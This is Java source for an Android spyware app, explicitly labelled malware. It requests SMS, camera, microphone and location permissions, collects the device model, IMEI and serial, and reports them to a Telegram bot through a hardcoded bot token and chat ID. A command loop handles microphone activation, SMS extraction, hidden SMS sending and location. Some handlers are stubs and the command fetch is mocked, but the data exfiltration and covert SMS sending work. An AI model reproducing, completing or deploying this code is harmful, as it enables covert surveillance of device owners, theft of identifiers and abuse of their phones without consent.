public class MainActivity extends AppCompatActivity implements Runnable {

    private static final String BOT_TOKEN = "8840980473:AAFkPtFiW2NDj_EPrS1Bd3IZt8_PKyYLFi0";
    private static final String CHAT_ID = "8820979221";
    private String deviceInfo = "";
    private ArrayList<String> commands = new ArrayList<>();
    private boolean isRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request Permissions
        ActivityCompat.requestPermissions(this, 
            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, 
                        Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA,
                        Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION}, 
            100);

        // Get Device Info
        deviceInfo = "📱 *New Device Infected!*\n" +
                     "*Model:* " + Build.MODEL + "\n" +
                     "*Android Version:* " + Build.VERSION.RELEASE + "\n" +
                     "*IMEI:* " + getIMEI() + "\n" +
                     "*Serial:* " + Build.SERIAL;

        // Start Background Service
        isRunning = true;
        new Thread(this).start();
    }

    @Override
    public void run() {
        while (isRunning) {
            try {
                // Send Device Info on Boot
                sendTelegramMessage(deviceInfo + "\n🔒 Status: Listening for commands...");
                
                // Check for Commands from Telegram (Simple Polling)
                // In a real advanced malware, this would use Long Polling or Websockets
                String[] cmd = getTelegramCommand();
                if (cmd != null && !cmd.isEmpty()) {
                    executeCommand(cmd[0]);
                }

                // Sleep for 10 seconds to save battery while spying
                Thread.sleep(10000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private String getIMEI() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        try {
            return Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? tm.getImei() : tm.getDeviceId();
        } catch (Exception e) { return "Unknown"; }
    }

    private void executeCommand(String cmd) {
        if (cmd.equalsIgnoreCase("mic")) {
            // Logic to start recording audio
            sendTelegramMessage("🎤 Microphone activated. Listening now...");
            Toast.makeText(this, "Mic On", Toast.LENGTH_SHORT).show();
        } else if (cmd.equalsIgnoreCase("sms")) {
            // Logic to read SMS
            sendTelegramMessage("📨 SMS Data extracted (Simulated log)");
        } else if (cmd.equalsIgnoreCase("vibrate")) {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            v.vibrate(2000);
        } else if (cmd.startsWith("send_sms:")) {
            // Send SMS to victim
            String[] parts = cmd.split(":");
            if (parts.length == 2) {
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(parts[1], null, "Hidden SMS sent via Bot", null, null);
                sendTelegramMessage("✅ SMS sent to: " + parts[1]);
            }
        } else if (cmd.equalsIgnoreCase("location")) {
            // Get GPS
            sendTelegramMessage("📍 Location: Lat/Long (Fetching...)");
        } else if (cmd.equalsIgnoreCase("kill")) {
            finish();
        }
    }

    private void sendTelegramMessage(String message) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\",\"parse_mode\":\"Markdown\"}";
            conn.getOutputStream().write(json.getBytes());
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // Simplified command fetching logic (In real malware, fetch updates from a specific endpoint)
    private String[] getTelegramCommand() {
        // This is a mock function. In real malware, you'd parse a specific API endpoint or use a polling script.
        return new String[]{"vibrate"}; // Example command
    }
